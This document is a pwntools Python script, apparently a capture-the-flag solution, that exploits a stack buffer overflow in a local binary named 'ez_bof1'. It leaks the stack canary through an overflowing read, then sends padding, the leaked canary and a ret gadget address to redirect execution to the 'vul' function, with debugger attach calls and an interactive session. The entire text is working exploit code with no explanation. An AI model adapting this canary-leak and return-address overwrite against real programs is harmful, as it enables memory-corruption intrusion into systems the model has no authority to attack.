from pwn import *

p=process("./ez_bof1")
e=ELF("./ez_bof1")
context.log_level='debug'
pop_gadget=0x40115d
ret=0x401016 
vul=e.symbols["vul"]

gdb.attach(p)
pause()
p.send(b'A'*9)
p.recvuntil(b"data:"+b'A'*9)
#pause()
canary=b'\x00'+p.recvline()[:-2]
print(canary)
#p.sendafter("msg?",b'B'*8+canary+b'C'*0x8+p64(pop_gadget)+b'D'*8+p64(vul))
p.sendafter("msg?",b'B'*8+canary+b'C'*0x8+p64(ret)+p64(vul))
pause()
p.interactive()
